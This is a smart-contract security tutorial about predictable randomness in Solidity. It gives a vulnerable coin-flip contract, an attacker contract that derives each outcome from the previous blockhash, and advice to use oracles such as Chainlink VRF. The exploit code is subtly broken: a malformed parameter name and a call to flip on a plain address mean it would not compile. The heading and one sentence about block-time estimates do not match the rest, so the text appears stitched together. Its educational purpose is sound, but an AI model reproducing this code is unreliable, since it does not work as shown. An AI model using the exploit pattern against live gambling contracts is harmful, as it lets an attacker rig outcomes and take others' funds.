# Avoid using `block.number` as a timestamp

Ability to generate `random numbers` is very helpful in all kinds of applications. One obvious example is gambling DApps, where pseudo-random number generator is used to pick the winner. For example, use of `block.timestamp` is insecure, as a miner can choose to provide any timestamp within a few seconds and still get his block accepted by others. Use of `blockhash`, `block.difficulty` and other fields is also insecure, as they're controlled by the miner. If the stakes are high, the miner can mine lots of blocks in a short time by renting hardware, pick the block that has required block hash for him to win, and drop all others.

#### This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip.

    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    contract CoinFlip {

      uint256 public consecutiveWins;
      uint256 lastHash;
      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

      constructor() {
        consecutiveWins = 0;
      }

      function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
          revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
          consecutiveWins++;
          return true;
        } else {
          consecutiveWins = 0;
          return false;
        }
      }
    }
    
    
There are three state variables in above contract:

* `consecutiveWins` initialized by zero from the constructor. This variable will count how many consecutive correct guess we have made. 
* `FACTOR` that is declared as `57896044618658097711785492504343953926634992332820282019728792003956564819968`.
* `lastHash` that will be updated each time by the `flip() function`





### Attacker


    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    contract Attacker {

      uint256 lastHash;
      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


      function attack(address _ CoinFlipContractAdd) public returns (bool) {
          uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        _CoinFlipContractAdd.flip(side);

      }
    }
    
    
   
    
    
  It is possible to estimate a time delta using the `block.number` property and average `block time`, however this is not future proof as block times may change
  
  Here, the attacker can easily manipulate the `random guess`  for the flip coin game.
  
 ## Prevent technique
 
 Using external sources of randomness via oracles, e.g. Oraclize. Note that this approach requires trusting in oracle, thus it may be reasonable to use multiple oracles.
  
 ### Chainlink VRF
 
 `Chainlink VRF (Verifiable Random Function)` is a provably fair and verifiable `random number generator (RNG)` that enables smart contracts
 to access random values without compromising security or usability. For each request, Chainlink `VRF generates` one or more random values 
 and `cryptographic proof` of how those values were determined. The proof is published and verified on-chain before any consuming applications
 can use it. This process ensures that results cannot be tampered with or manipulated by any single entity including `oracle operators`, `miners`
 , `users`, or `smart contract developers`.
  
  
  
  
  
  
  
